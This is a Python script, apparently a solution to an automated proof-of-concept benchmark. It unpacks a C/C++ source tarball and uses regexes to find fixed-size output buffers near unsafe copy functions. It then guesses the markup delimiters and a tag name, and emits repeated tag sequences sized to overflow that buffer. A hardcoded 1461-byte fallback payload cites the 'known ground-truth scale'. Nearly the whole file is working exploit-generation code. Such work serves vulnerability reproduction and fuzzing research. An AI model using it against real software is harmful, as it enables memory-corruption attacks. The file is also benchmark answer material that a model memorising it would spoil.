import os
import re
import io
import tarfile
import tempfile
import shutil
from typing import List, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="arvo_poc_")
        try:
            root = self._extract_tarball(src_path, tmpdir)
            src_files = self._collect_source_files(root)

            if not src_files:
                return self._fallback_poc()

            texts = []
            total = 0
            max_total = 6_000_000
            for p in src_files:
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                    if not data:
                        continue
                    try:
                        t = data.decode("utf-8", "ignore")
                    except Exception:
                        t = data.decode("latin-1", "ignore")
                    if t:
                        texts.append(t)
                        total += len(t)
                        if total >= max_total:
                            break
                except Exception:
                    continue

            combined = "\n".join(texts)

            bufsize = self._infer_output_bufsize(src_files)
            delim_start, delim_end = self._infer_delimiters(combined)
            tag = self._infer_tag_name(combined) or "b"

            payload = self._generate_payload(bufsize, delim_start, delim_end, tag)

            if len(payload) < 64:
                return self._fallback_poc()
            return payload
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def _extract_tarball(self, tar_path: str, out_dir: str) -> str:
        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

        with tarfile.open(tar_path, "r:*") as tar:
            members = tar.getmembers()
            for m in members:
                if not m.name or m.name.startswith("/") or ".." in m.name.split("/"):
                    continue
                target = os.path.join(out_dir, m.name)
                if not is_within_directory(out_dir, target):
                    continue
                tar.extract(m, out_dir)

        entries = [os.path.join(out_dir, e) for e in os.listdir(out_dir)]
        dirs = [p for p in entries if os.path.isdir(p)]
        if len(dirs) == 1:
            return dirs[0]
        return out_dir

    def _collect_source_files(self, root: str) -> List[str]:
        exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".inc"}
        out = []
        for base, dirs, files in os.walk(root):
            dirs[:] = [d for d in dirs if d not in (".git", ".svn", ".hg", "build", "cmake-build-debug", "cmake-build-release")]
            for fn in files:
                _, ext = os.path.splitext(fn)
                if ext.lower() in exts:
                    out.append(os.path.join(base, fn))
        return out

    def _infer_output_bufsize(self, src_files: List[str]) -> int:
        pat_arr = re.compile(r"\bchar\s+([A-Za-z_]\w*)\s*\[\s*(\d{2,6})\s*\]\s*;")
        pat_unsafe = re.compile(r"\b(v?sprintf|vsnprintf|sprintf|strcpy|strcat|stpcpy|memcpy|memmove)\s*\(")
        best = None  # (score, size)
        for p in src_files:
            try:
                with open(p, "rb") as f:
                    data = f.read()
                if not data:
                    continue
                try:
                    t = data.decode("utf-8", "ignore")
                except Exception:
                    t = data.decode("latin-1", "ignore")
                if not t:
                    continue
            except Exception:
                continue

            for m in pat_arr.finditer(t):
                name = m.group(1)
                try:
                    size = int(m.group(2))
                except Exception:
                    continue
                if size < 64 or size > 1_000_000:
                    continue
                if not any(k in name.lower() for k in ("out", "buf", "dst", "dest", "result", "render", "output")):
                    continue

                start = max(0, m.start() - 1500)
                end = min(len(t), m.end() + 2000)
                window = t[start:end]
                unsafe = len(pat_unsafe.findall(window))
                tag_hits = window.lower().count("tag")
                score = unsafe * 7 + tag_hits * 2
                if best is None or score > best[0]:
                    best = (score, size)

        if best is None:
            # fallback: look for common defines
            define_pat = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*(?:OUT|OUTPUT|DST|DEST|BUF|BUFFER)\w*)\s+(\d{2,6})\b", re.M)
            sizes = []
            for p in src_files[:200]:
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                    try:
                        t = data.decode("utf-8", "ignore")
                    except Exception:
                        t = data.decode("latin-1", "ignore")
                except Exception:
                    continue
                for m in define_pat.finditer(t):
                    try:
                        v = int(m.group(2))
                        if 64 <= v <= 16384:
                            sizes.append(v)
                    except Exception:
                        pass
            if sizes:
                return min(sizes)
            return 1024

        size = best[1]
        if size < 128:
            return 1024
        if size > 16384:
            return 4096
        return size

    def _infer_delimiters(self, text: str) -> Tuple[bytes, bytes]:
        candidates = [
            (b"{{", b"}}"),
            (b"{%", b"%}"),
            (b"[[", b"]]"),
            (b"<<", b">>"),
            (b"<", b">"),
            (b"[", b"]"),
            (b"{", b"}"),
            (b"&", b";"),
            (b"%", b"%"),
        ]

        # Focus on tag-related vicinity to reduce brace noise
        low = text.lower()
        idxs = [m.start() for m in re.finditer(r"\btag\b", low)]
        slices = []
        for i in idxs[:300]:
            a = max(0, i - 4000)
            b = min(len(text), i + 4000)
            slices.append(text[a:b])
        focus = "\n".join(slices) if slices else text

        def score_pair(start: bytes, end: bytes) -> int:
            s = 0
            ss = start.decode("latin-1")
            ee = end.decode("latin-1")

            if len(start) == 1:
                ch = re.escape(ss)
                s += 8 * len(re.findall(rf"==\s*'{ch}'", focus))
                s += 8 * len(re.findall(rf"case\s*'{ch}'", focus))
                s += 5 * len(re.findall(rf"\bif\s*\([^)]*'{ch}'", focus))
                s += 3 * focus.count(f'"{ss}"')
                s += 3 * focus.count(f"'{ss}'")
            else:
                s += 15 * focus.count(f'"{ss}"')
                s += 10 * len(re.findall(rf"\bstrncmp\s*\([^;]*\"{re.escape(ss)}\"", focus))
                s += 10 * len(re.findall(rf"\bmemcmp\s*\([^;]*\"{re.escape(ss)}\"", focus))
                s += 4 * focus.count(ss)

            if len(end) == 1:
                ch = re.escape(ee)
                s += 8 * len(re.findall(rf"==\s*'{ch}'", focus))
                s += 8 * len(re.findall(rf"case\s*'{ch}'", focus))
                s += 5 * len(re.findall(rf"\bif\s*\([^)]*'{ch}'", focus))
                s += 3 * focus.count(f'"{ee}"')
                s += 3 * focus.count(f"'{ee}'")
            else:
                s += 15 * focus.count(f'"{ee}"')
                s += 10 * len(re.findall(rf"\bstrncmp\s*\([^;]*\"{re.escape(ee)}\"", focus))
                s += 10 * len(re.findall(rf"\bmemcmp\s*\([^;]*\"{re.escape(ee)}\"", focus))
                s += 4 * focus.count(ee)

            # Bonus if "tag" appears near the delimiter in focus
            for lit in (ss, ee):
                for m in re.finditer(re.escape(lit), focus):
                    a = max(0, m.start() - 80)
                    b = min(len(focus), m.end() + 80)
                    if "tag" in focus[a:b].lower():
                        s += 6
                        break

            return s

        best = None  # (score, start, end)
        for st, en in candidates:
            sc = score_pair(st, en)
            if best is None or sc > best[0]:
                best = (sc, st, en)

        if best is None or best[0] < 8:
            return b"<", b">"
        return best[1], best[2]

    def _infer_tag_name(self, text: str) -> Optional[str]:
        low = text.lower()
        idxs = [m.start() for m in re.finditer(r"\btag\b", low)]
        slices = []
        for i in idxs[:200]:
            a = max(0, i - 6000)
            b = min(len(text), i + 6000)
            slices.append(text[a:b])
        focus = "\n".join(slices) if slices else text

        tags = {}
        # strcmp(tag, "name") or strcmp("name", tag)
        cmp_pat = re.compile(
            r"\b(strcasecmp|strcasecmp_l|strcmp|strncmp|strcasecmp|strncasecmp)\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"([A-Za-z0-9_\-]{1,24})\"\s*(?:,|\))",
            re.M,
        )
        cmp_pat2 = re.compile(
            r"\b(strcasecmp|strcasecmp_l|strcmp|strncmp|strcasecmp|strncasecmp)\s*\(\s*\"([A-Za-z0-9_\-]{1,24})\"\s*,\s*([A-Za-z_]\w*)\s*(?:,|\))",
            re.M,
        )

        for m in cmp_pat.finditer(focus):
            var = m.group(2)
            name = m.group(3)
            if "tag" in var.lower():
                tags[name] = tags.get(name, 0) + 5

        for m in cmp_pat2.finditer(focus):
            name = m.group(2)
            var = m.group(3)
            if "tag" in var.lower():
                tags[name] = tags.get(name, 0) + 5

        # Tag tables: { "b", ... } near "tag"
        table_pat = re.compile(r"\{\s*\"([A-Za-z0-9_\-]{1,16})\"\s*,")
        for m in table_pat.finditer(focus):
            name = m.group(1)
            a = max(0, m.start() - 120)
            b = min(len(focus), m.end() + 120)
            if "tag" in focus[a:b].lower():
                tags[name] = tags.get(name, 0) + 2

        if not tags:
            # Try common safe tags
            for cand in ("b", "i", "u", "br", "p", "span", "a", "font", "color"):
                if cand in low:
                    return cand
            return None

        # Prefer shortest among highest score (often simplest tag names)
        best_score = max(tags.values())
        best = [k for k, v in tags.items() if v == best_score]
        best.sort(key=lambda x: (len(x), x))
        return best[0] if best else None

    def _generate_payload(self, bufsize: int, start: bytes, end: bytes, tag: str) -> bytes:
        if bufsize < 128:
            bufsize = 1024
        if bufsize > 65536:
            bufsize = 4096

        # Aim close to likely overflow while keeping moderate size
        target = int(bufsize * 1.45) + 32
        if target < bufsize + 64:
            target = bufsize + 64
        if target < 1100:
            target = 1100
        if target > 8000:
            target = 8000

        t = tag.encode("ascii", "ignore") or b"b"

        # Build units that repeatedly enter the "tag found" code path.
        if start == b"&" and end == b";":
            unit = b"&" + t + b";" + b"A"
        elif start == b"%" and end == b"%":
            unit = b"%" + t + b"%" + b"A" + b"%" + b"/" + t + b"%"
        elif start in (b"{{", b"{%"):
            # Common templating forms; include both open and close-ish patterns
            unit = start + t + end + b"A" + start + b"/" + t + end
        elif start in (b"[[", b"<<"):
            unit = start + t + end + b"A" + start + b"/" + t + end
        elif start in (b"<", b"[", b"{"):
            if start == b"<" and end == b">":
                open_t = b"<" + t + b">"
                close_t = b"</" + t + b">"
            elif start == b"[" and end == b"]":
                open_t = b"[" + t + b"]"
                close_t = b"[/" + t + b"]"
            else:
                open_t = b"{" + t + b"}"
                close_t = b"{/" + t + b"}"
            unit = open_t + b"A" + close_t
        else:
            unit = start + t + end + b"A"

        if len(unit) <= 0:
            return self._fallback_poc()

        reps = (target + len(unit) - 1) // len(unit)
        payload = unit * reps

        # Ensure trailing newline (often improves parser behavior)
        if not payload.endswith(b"\n"):
            payload += b"\n"

        return payload

    def _fallback_poc(self) -> bytes:
        # Conservative angle-bracket payload around the known ground-truth scale.
        # Use a valid-looking open/close tag with enough repeated sequences.
        tag = b"b"
        unit = b"<" + tag + b">" + b"A" + b"</" + tag + b">"
        target = 1461
        reps = (target + len(unit) - 1) // len(unit)
        payload = unit * reps
        return payload[:target] if len(payload) >= target else payload + b"\n"